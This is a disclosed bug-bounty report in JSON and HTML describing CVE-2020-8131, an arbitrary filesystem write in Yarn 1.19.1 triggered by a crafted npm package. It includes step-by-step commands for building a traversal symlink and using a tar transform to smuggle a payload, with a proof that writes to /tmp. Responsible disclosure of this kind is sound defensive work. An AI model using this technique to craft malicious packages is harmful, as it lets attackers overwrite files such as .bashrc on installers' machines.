{"id":730239,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzAyMzk=","url":"https://hackerone.com/reports/730239","title":"Filesystem Writes via `yarn install` via symlinks and tar transforms inside a crafted malicious package","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-11-06T08:13:31.709Z","submitted_at":"2019-11-06T08:13:31.709Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rhyselsmore","url":"/rhyselsmore","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8131"],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-15T00:33:41.258Z","bug_reporter_agreed_on_going_public_at":"2020-02-15T00:33:41.187Z","team_member_agreed_on_going_public_at":"2020-02-07T08:58:09.575Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report an arbitrary filesystem write vulnerability in Yarn when installing a malicious package from the default repositories. This vulnerability has the potential for RCE -- even if `--ignore-scripts` is disabled.\n\nIt allows a malicious package, upon install, to write to any path on the filesystem -- For example, `yarn install my-malicious-package --ignore-scripts` can write a malicious file anywhere on the filesystem. This may be changes to `.bashrc`, `.yarnrc`, `.npmrc` etc, or modifications to other known dependancies -- all which give the ability for RCE.\n\nThe outcome here is that a malicious package, particularly a popular one, installed in what is thought to be a secure fashion, actually has filesystem write abilities.\n\nAsset was not selected as it was not in the list.\n\n# Module\n\n**module name:** yarn\n**version:** 1.19.1\n**npm page:** `https://www.npmjs.com/package/yarn`\n\n## Module Description\n\nFast, reliable, and secure dependency management.\n\n## Module Stats\n\n1,088,779 weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\n### Objective\n\nAs part of my research, I had come across the need to write an arbitrary file using `yarn install` in order to escalate a vulnerability.\n\nThis target did not allow for yarn post-install hooks, but they did have one other bit of functionality that relied on a file being present in a certain directory outside of the node module installation path in order to trigger a vulnerability. \n\nAs such, I decided to investigate if it was possible to write this file via a malicious package installed via `yarn`.\n\nFor the purposes of this report, the file we want to write is `/tmp/my-file` - however it should be noted that the outcome of this report is that I am able to write to any new or existing file on the filesystem on behalf of the user calling `yarn install`.\n\n### Yarn Package Installation\n\nThe yarn package manager, by default, allows for the execution of arbitrary shell commands during package installation.\n\nThis in itself allows for arbitrary file system writes. Take the following package.json as an example:\n\n```\n{\n  \"name\": \"my-malicious-package\",\n  \"version\": \"1.0.38\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"postinstall\": \"echo ‚Äòfoo‚Äô \u003e /tmp/file\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\nUpon running `yarn install my-malicious package`, the command `echo ‚Äòfoo‚Äô \u003e /tmp/file` will be run after a successful package installation.\n\nThis functionality is disabled by adding the `--ignore-scripts` flag to the installation command. As such, running the command `yarn install my-malicious package --ignore-scripts` will not execute our command.\n\nAll other behaviours of `yarn install` are deterministic based on the system configuration. That is, binaries, installed dependencies, package caches etc will all be placed in the expected directories based on the configuration of the system, and no other side-effects will take place.\n\nWith that in mind, the installer of a package, who is using the `--ignore-scripts` flag will expect that no side effects except the installation of files in known directories will take place.\n\nFurthermore, with this flag, it is expected, that until such time that the package is executed (via a require within NodeJS code), that no side effects will occur. \n\n### Node Package Structure\n\nA node package takes the form of a gzipped tarball, and at its most basic, will look like so:\n\n```\n$ gtar --list --file y-1.0.0.tgz\npackage/package.json\n```\n\nAll other source code, binaries, assets, documentation etc - any file that is included by the package producer - is also included in this `package` directory.\n\n### Symlink Handling\n\nGiven that the package takes the form of a gzipped tarball, I decided to test if symlinks are unpacked as part of the Yarn install process. I decided to create a basic package, like so:\n\n```\n$ ln -s /tmp/my-file package/my-file\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   11  3 Nov 11:21 my-file -\u003e /tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 09:51 package.json\n```\n\nI then created a gzipped tarball of the directory, pushed it via `npm publish`. \n\n```\n$ gtar -cvzf y-1.0.0.tgz package/package.json package/my-file\npackage/package.json\npackage/my-file\n ```\n\n```\n$ npm publish y-1.0.0.tgz\nnpm notice\nnpm notice üì¶  my-malicious-package@1.0.0\nnpm notice === Tarball Contents ===\nnpm notice 214B package.json\nnpm notice 0    my-file\nnpm notice === Tarball Details ===\nnpm notice name:          my-malicious-package\nnpm notice version:       1.0.0\nnpm notice package size:  336 B\nnpm notice unpacked size: 214 B\nnpm notice shasum:        4f6667e5abc68053f87aff4198114dcf2556b5ea\nnpm notice integrity:     sha512-09ZKNIm3Pr+Ix[...]XmgK1FISw5cPw==\nnpm notice total files:   2\nnpm notice\n+ my-malicious-package@1.0.0\n ```\n\nI then attempted an installation of it within a temporary directory on my computer. Upon looking at the installed files, I received the following listing:\n\n```\n$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   10  3 Nov 11:26 my-file -\u003e tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:26 package.json\n```\n\nInteresting. Any absolute path would have the leading / stripped off, thus resolving to a target that does not exist.\n\n### Symlink Directory Transversal\n\nGiven that absolute paths to a target would not work, I then decided to pull out my next trick - being directory transversal.\n\nI started by recreating the symlink, but with a different payload:\n\n```\n$ ln -s ../../../../../../../../../../../../tmp/my-file package/my-file\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   11  3 Nov 11:31 my-file -\u003e ../../../../../../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:30 package.json\n```\n\nI then incremented the package version, pushed it to npm, and performed a fresh install. Upon looking at the installed files, I received the following listing:\n\n```\n$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   32  3 Nov 11:34 my-file -\u003e ../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:34 package.json\n```\n\nPerfect! It appears that yarn, when extracting the contents of a package, does not account for directory transversal in symlinks. \n\nHowever, this was only the first step in a long step of testing to find a way to inject contents into that file.\n\n### Symlink Write Attempts\n\nIn order to write to the symlink, I decided to try a number of things, including:\n\n* Searching for functionality in yarn install that would transform a file in the package into another file. I was not successful in finding a vector.\n* Creating an archive with a symlinked folder called `tmp` pointing to `/tmp`, along with a file to be extracted to `tmp/my-file`; however, yarn did not seem to extract a file into a symlinked folder.\n* Symlinking directories within `node_modules/`, such as `.bin`, `my-malicious-dependancy` etc.\n\nAll in all, I spent about 10 hours trying different mechanisms to write to this symlink that was present within my malicious package during the `yarn install` process.\n\n### Leaning on tar Transforms\n\nAfter a lot of trial and error, I decided to lean on tar file transforms. Put simply, this feature of tar allows for file contents to be added with a different path to that on the filesystem. It is basically a way to say ‚Äúthis file on my local filesystem, I want it extracted to this location on the target filesystem.\n\nPut simply, it might look like this:\n\n```\n$ gtar --transform='s|package/my-file|package/my-file2|' -cvzf y-1.0.0.tgz package/package.json package/my-file\npackage/package.json\npackage/my-file\n```\n \n```\n$ gtar --list --file y-1.0.0.tgz\npackage/package.json\npackage/my-file2\n```\n\nAlthough we placed the file of `package/my-file` into the tar archive, it will be extracted as `package/my-file2`.\n\nHowever, most tar extractors are wary of behaviour like this, as it commonly allows for attacks such as this one. As such, they do a lot of work to prevent files being written maliciously.\n\nAs part of this testing, I tried numerous methods, including my original path transversal method, as well as directory extracting into `/tmp/my-file`. Then, after several hours of testing - I had an aha moment; in our original test, yarn was extracting leading slashes from files that were being extracted when they had absolute references.\n\nIf we could create a file with a random name, with the contents of the file we wanted at `/tmp/my-file`, and could somehow put it into the tar file under an absolute path of `/my-file`, could we somehow trick yarn into first stripping the leading slash, and then extracting the contents into our symlink?\n\nTo test this, I created a file called `package/my-file`, and gave it the contents of `abc123`:\n\n```\n$ echo \"abc123\" \u003e package/payload\n```\n\nThis gave us the directory structure like so:\n\n```\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   47  3 Nov 11:31 my-file -\u003e ../../../../../../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:33 package.json\n-rw-r--r--  1 rhyselsmore  staff    7  3 Nov 11:54 payload\n```\n\nI then created a new gzipped tar, but with an additional transform.\n\n```\n$ gtar --transform='s|package/payload|/my-file|' -cvzf y-1.0.0.tgz package/package.json package/my-file package/payload\npackage/package.json\npackage/my-file\npackage/payload\n```\n\nFinally, I inspected the contents of the tar:\n\n```\n$ gtar --list --file y-1.0.0.tgz\npackage/package.json\npackage/my-file\ngtar: Removing leading `/' from member names\n/my-file\n```\n\nIt was time to test. First of all, I ensured that no such file existed at `/tmp/my-file`, by running `rm -f /tmp/my-file`. I then published a new version of the package, and installed it:\n\n```\n$ yarn add my-malicious-package@1.0.41\nyarn add v1.16.0\n[1/4] üîç  Resolving packages...\n[2/4] üöö  Fetching packages...\n[3/4] üîó  Linking dependencies...\n[4/4] üî®  Building fresh packages...\nsuccess Saved lockfile.\nsuccess Saved 1 new dependency.\ninfo Direct dependencies\n‚îî‚îÄ my-malicious-package@1.0.41\ninfo All dependencies\n‚îî‚îÄ my-malicious-package@1.0.41\n‚ú®  Done in 1.91s.\n```\n\nI checked the contents of the directory where it was installed, and say only two items:\n\n```\n$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   32  3 Nov 12:00 my-file -\u003e ../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 12:00 package.json\n```\n\nAnd finally, decided to check the existance of the file in `/tmp/my-file`:\n\n```\n$ ls -la /tmp/my-file\n-rw-r--r--  1 rhyselsmore  wheel  7  3 Nov 12:00 /tmp/my-file\n$ cat /tmp/my-file\nabc123\n```\n\nSuccess! We were able to write an arbitrary file onto the filesystem.\n\n### Steps To Reproduce:\n\nYou will need NodeJS \u0026 Yarn installed. This has only been tested on OSX systems, however it would also work on Unix systems, and will write a file into `/tmp/my-file`. Ensure this file doesn‚Äôt exist first.\n\n1. Create a new folder somewhere on your filesystem.\n2. Navigate into it, and run `yarn init`. Press enter for all of the questions.\n3. Then run `yarn add my-malicious-package@1.0.50 --ignore-scripts`\n4. Check for the existence and contents of `/tmp/my-file`. It should contain `abc123`\n\n## Patch\n\nNo patch as of yet.\n\n## Supporting Material/References:\n\n\u003e State all technical information about the stack where the vulnerability was found\n\n- Linux/OSX\n- v12.3.1\n- 6.9.0\n- gtar OSX (1.32)\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N\n\n# Please copy in a photo of two great Australian Shepherds\n\nPlease see attached photo.\n\n## Impact\n\n- An attacker bypasses the claims that `--ignore-scripts` and other hardening measures will lead to less chance of remote code execution. As such, security conscious users of Yarn will be exposed when installing packages which make use of this attack -- as will companies who download and package Yarn dependancies on behalf of end-users in sandboxes (for example, company x receives a list of packages + custom functions from an end-user, and builds them in their build servers).\n\n- Yarn generally claims that unless post/pre-install hooks are present, there is little chance of remote code execution. A through review of source code does not protect against this attack; as the attack does not live in NodeJS, nor the package.json - it is in the structure of the package itself. \n\n- For example, Bob messages Alice and says \"I have pushed the code to xyz on NPM, can you take a look?\" - Alice downloads the package using all of the secure flags (`--ignore-scripts`, `--no-default-rc`) - yet Bob is still able to write files on Alice's system, possibly leading to RCE.\n\n- Finally, in the event of a package being published maliciously (as what has been seen previously), a popular package may have an additional vector in which it can be weaponized.","vulnerability_information_html":"\u003cp\u003eI would like to report an arbitrary filesystem write vulnerability in Yarn when installing a malicious package from the default repositories. This vulnerability has the potential for RCE -- even if \u003ccode\u003e--ignore-scripts\u003c/code\u003e is disabled.\u003c/p\u003e\n\n\u003cp\u003eIt allows a malicious package, upon install, to write to any path on the filesystem -- For example, \u003ccode\u003eyarn install my-malicious-package --ignore-scripts\u003c/code\u003e can write a malicious file anywhere on the filesystem. This may be changes to \u003ccode\u003e.bashrc\u003c/code\u003e, \u003ccode\u003e.yarnrc\u003c/code\u003e, \u003ccode\u003e.npmrc\u003c/code\u003e etc, or modifications to other known dependancies -- all which give the ability for RCE.\u003c/p\u003e\n\n\u003cp\u003eThe outcome here is that a malicious package, particularly a popular one, installed in what is thought to be a secure fashion, actually has filesystem write abilities.\u003c/p\u003e\n\n\u003cp\u003eAsset was not selected as it was not in the list.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e yarn\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.19.1\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/yarn\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eFast, reliable, and secure dependency management.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e1,088,779 weekly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003ch3 id=\"objective\"\u003eObjective\u003c/h3\u003e\n\n\u003cp\u003eAs part of my research, I had come across the need to write an arbitrary file using \u003ccode\u003eyarn install\u003c/code\u003e in order to escalate a vulnerability.\u003c/p\u003e\n\n\u003cp\u003eThis target did not allow for yarn post-install hooks, but they did have one other bit of functionality that relied on a file being present in a certain directory outside of the node module installation path in order to trigger a vulnerability. \u003c/p\u003e\n\n\u003cp\u003eAs such, I decided to investigate if it was possible to write this file via a malicious package installed via \u003ccode\u003eyarn\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eFor the purposes of this report, the file we want to write is \u003ccode\u003e/tmp/my-file\u003c/code\u003e - however it should be noted that the outcome of this report is that I am able to write to any new or existing file on the filesystem on behalf of the user calling \u003ccode\u003eyarn install\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"yarn-package-installation\"\u003eYarn Package Installation\u003c/h3\u003e\n\n\u003cp\u003eThe yarn package manager, by default, allows for the execution of arbitrary shell commands during package installation.\u003c/p\u003e\n\n\u003cp\u003eThis in itself allows for arbitrary file system writes. Take the following package.json as an example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;name\u0026quot;: \u0026quot;my-malicious-package\u0026quot;,\n  \u0026quot;version\u0026quot;: \u0026quot;1.0.38\u0026quot;,\n  \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,\n  \u0026quot;main\u0026quot;: \u0026quot;index.js\u0026quot;,\n  \u0026quot;scripts\u0026quot;: {\n    \u0026quot;postinstall\u0026quot;: \u0026quot;echo ‚Äòfoo‚Äô \u0026gt; /tmp/file\u0026quot;\n  },\n  \u0026quot;author\u0026quot;: \u0026quot;\u0026quot;,\n  \u0026quot;license\u0026quot;: \u0026quot;ISC\u0026quot;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUpon running \u003ccode\u003eyarn install my-malicious package\u003c/code\u003e, the command \u003ccode\u003eecho ‚Äòfoo‚Äô \u0026gt; /tmp/file\u003c/code\u003e will be run after a successful package installation.\u003c/p\u003e\n\n\u003cp\u003eThis functionality is disabled by adding the \u003ccode\u003e--ignore-scripts\u003c/code\u003e flag to the installation command. As such, running the command \u003ccode\u003eyarn install my-malicious package --ignore-scripts\u003c/code\u003e will not execute our command.\u003c/p\u003e\n\n\u003cp\u003eAll other behaviours of \u003ccode\u003eyarn install\u003c/code\u003e are deterministic based on the system configuration. That is, binaries, installed dependencies, package caches etc will all be placed in the expected directories based on the configuration of the system, and no other side-effects will take place.\u003c/p\u003e\n\n\u003cp\u003eWith that in mind, the installer of a package, who is using the \u003ccode\u003e--ignore-scripts\u003c/code\u003e flag will expect that no side effects except the installation of files in known directories will take place.\u003c/p\u003e\n\n\u003cp\u003eFurthermore, with this flag, it is expected, that until such time that the package is executed (via a require within NodeJS code), that no side effects will occur. \u003c/p\u003e\n\n\u003ch3 id=\"node-package-structure\"\u003eNode Package Structure\u003c/h3\u003e\n\n\u003cp\u003eA node package takes the form of a gzipped tarball, and at its most basic, will look like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gtar --list --file y-1.0.0.tgz\npackage/package.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAll other source code, binaries, assets, documentation etc - any file that is included by the package producer - is also included in this \u003ccode\u003epackage\u003c/code\u003e directory.\u003c/p\u003e\n\n\u003ch3 id=\"symlink-handling\"\u003eSymlink Handling\u003c/h3\u003e\n\n\u003cp\u003eGiven that the package takes the form of a gzipped tarball, I decided to test if symlinks are unpacked as part of the Yarn install process. I decided to create a basic package, like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ln -s /tmp/my-file package/my-file\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   11  3 Nov 11:21 my-file -\u0026gt; /tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 09:51 package.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI then created a gzipped tarball of the directory, pushed it via \u003ccode\u003enpm publish\u003c/code\u003e. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gtar -cvzf y-1.0.0.tgz package/package.json package/my-file\npackage/package.json\npackage/my-file\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ npm publish y-1.0.0.tgz\nnpm notice\nnpm notice üì¶  my-malicious-package@1.0.0\nnpm notice === Tarball Contents ===\nnpm notice 214B package.json\nnpm notice 0    my-file\nnpm notice === Tarball Details ===\nnpm notice name:          my-malicious-package\nnpm notice version:       1.0.0\nnpm notice package size:  336 B\nnpm notice unpacked size: 214 B\nnpm notice shasum:        4f6667e5abc68053f87aff4198114dcf2556b5ea\nnpm notice integrity:     sha512-09ZKNIm3Pr+Ix[...]XmgK1FISw5cPw==\nnpm notice total files:   2\nnpm notice\n+ my-malicious-package@1.0.0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI then attempted an installation of it within a temporary directory on my computer. Upon looking at the installed files, I received the following listing:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   10  3 Nov 11:26 my-file -\u0026gt; tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:26 package.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eInteresting. Any absolute path would have the leading / stripped off, thus resolving to a target that does not exist.\u003c/p\u003e\n\n\u003ch3 id=\"symlink-directory-transversal\"\u003eSymlink Directory Transversal\u003c/h3\u003e\n\n\u003cp\u003eGiven that absolute paths to a target would not work, I then decided to pull out my next trick - being directory transversal.\u003c/p\u003e\n\n\u003cp\u003eI started by recreating the symlink, but with a different payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ln -s ../../../../../../../../../../../../tmp/my-file package/my-file\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   11  3 Nov 11:31 my-file -\u0026gt; ../../../../../../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:30 package.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI then incremented the package version, pushed it to npm, and performed a fresh install. Upon looking at the installed files, I received the following listing:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   32  3 Nov 11:34 my-file -\u0026gt; ../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:34 package.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePerfect! It appears that yarn, when extracting the contents of a package, does not account for directory transversal in symlinks. \u003c/p\u003e\n\n\u003cp\u003eHowever, this was only the first step in a long step of testing to find a way to inject contents into that file.\u003c/p\u003e\n\n\u003ch3 id=\"symlink-write-attempts\"\u003eSymlink Write Attempts\u003c/h3\u003e\n\n\u003cp\u003eIn order to write to the symlink, I decided to try a number of things, including:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSearching for functionality in yarn install that would transform a file in the package into another file. I was not successful in finding a vector.\u003c/li\u003e\n\u003cli\u003eCreating an archive with a symlinked folder called \u003ccode\u003etmp\u003c/code\u003e pointing to \u003ccode\u003e/tmp\u003c/code\u003e, along with a file to be extracted to \u003ccode\u003etmp/my-file\u003c/code\u003e; however, yarn did not seem to extract a file into a symlinked folder.\u003c/li\u003e\n\u003cli\u003eSymlinking directories within \u003ccode\u003enode_modules/\u003c/code\u003e, such as \u003ccode\u003e.bin\u003c/code\u003e, \u003ccode\u003emy-malicious-dependancy\u003c/code\u003e etc.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAll in all, I spent about 10 hours trying different mechanisms to write to this symlink that was present within my malicious package during the \u003ccode\u003eyarn install\u003c/code\u003e process.\u003c/p\u003e\n\n\u003ch3 id=\"leaning-on-tar-transforms\"\u003eLeaning on tar Transforms\u003c/h3\u003e\n\n\u003cp\u003eAfter a lot of trial and error, I decided to lean on tar file transforms. Put simply, this feature of tar allows for file contents to be added with a different path to that on the filesystem. It is basically a way to say ‚Äúthis file on my local filesystem, I want it extracted to this location on the target filesystem.\u003c/p\u003e\n\n\u003cp\u003ePut simply, it might look like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gtar --transform=\u0026#39;s|package/my-file|package/my-file2|\u0026#39; -cvzf y-1.0.0.tgz package/package.json package/my-file\npackage/package.json\npackage/my-file\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gtar --list --file y-1.0.0.tgz\npackage/package.json\npackage/my-file2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlthough we placed the file of \u003ccode\u003epackage/my-file\u003c/code\u003e into the tar archive, it will be extracted as \u003ccode\u003epackage/my-file2\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eHowever, most tar extractors are wary of behaviour like this, as it commonly allows for attacks such as this one. As such, they do a lot of work to prevent files being written maliciously.\u003c/p\u003e\n\n\u003cp\u003eAs part of this testing, I tried numerous methods, including my original path transversal method, as well as directory extracting into \u003ccode\u003e/tmp/my-file\u003c/code\u003e. Then, after several hours of testing - I had an aha moment; in our original test, yarn was extracting leading slashes from files that were being extracted when they had absolute references.\u003c/p\u003e\n\n\u003cp\u003eIf we could create a file with a random name, with the contents of the file we wanted at \u003ccode\u003e/tmp/my-file\u003c/code\u003e, and could somehow put it into the tar file under an absolute path of \u003ccode\u003e/my-file\u003c/code\u003e, could we somehow trick yarn into first stripping the leading slash, and then extracting the contents into our symlink?\u003c/p\u003e\n\n\u003cp\u003eTo test this, I created a file called \u003ccode\u003epackage/my-file\u003c/code\u003e, and gave it the contents of \u003ccode\u003eabc123\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ echo \u0026quot;abc123\u0026quot; \u0026gt; package/payload\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis gave us the directory structure like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   47  3 Nov 11:31 my-file -\u0026gt; ../../../../../../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:33 package.json\n-rw-r--r--  1 rhyselsmore  staff    7  3 Nov 11:54 payload\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI then created a new gzipped tar, but with an additional transform.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gtar --transform=\u0026#39;s|package/payload|/my-file|\u0026#39; -cvzf y-1.0.0.tgz package/package.json package/my-file package/payload\npackage/package.json\npackage/my-file\npackage/payload\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFinally, I inspected the contents of the tar:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gtar --list --file y-1.0.0.tgz\npackage/package.json\npackage/my-file\ngtar: Removing leading `/\u0026#39; from member names\n/my-file\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt was time to test. First of all, I ensured that no such file existed at \u003ccode\u003e/tmp/my-file\u003c/code\u003e, by running \u003ccode\u003erm -f /tmp/my-file\u003c/code\u003e. I then published a new version of the package, and installed it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ yarn add my-malicious-package@1.0.41\nyarn add v1.16.0\n[1/4] üîç  Resolving packages...\n[2/4] üöö  Fetching packages...\n[3/4] üîó  Linking dependencies...\n[4/4] üî®  Building fresh packages...\nsuccess Saved lockfile.\nsuccess Saved 1 new dependency.\ninfo Direct dependencies\n‚îî‚îÄ my-malicious-package@1.0.41\ninfo All dependencies\n‚îî‚îÄ my-malicious-package@1.0.41\n‚ú®  Done in 1.91s.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI checked the contents of the directory where it was installed, and say only two items:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   32  3 Nov 12:00 my-file -\u0026gt; ../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 12:00 package.json\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd finally, decided to check the existance of the file in \u003ccode\u003e/tmp/my-file\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -la /tmp/my-file\n-rw-r--r--  1 rhyselsmore  wheel  7  3 Nov 12:00 /tmp/my-file\n$ cat /tmp/my-file\nabc123\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSuccess! We were able to write an arbitrary file onto the filesystem.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h3\u003e\n\n\u003cp\u003eYou will need NodeJS \u0026amp; Yarn installed. This has only been tested on OSX systems, however it would also work on Unix systems, and will write a file into \u003ccode\u003e/tmp/my-file\u003c/code\u003e. Ensure this file doesn‚Äôt exist first.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a new folder somewhere on your filesystem.\u003c/li\u003e\n\u003cli\u003eNavigate into it, and run \u003ccode\u003eyarn init\u003c/code\u003e. Press enter for all of the questions.\u003c/li\u003e\n\u003cli\u003eThen run \u003ccode\u003eyarn add my-malicious-package@1.0.50 --ignore-scripts\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eCheck for the existence and contents of \u003ccode\u003e/tmp/my-file\u003c/code\u003e. It should contain \u003ccode\u003eabc123\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eNo patch as of 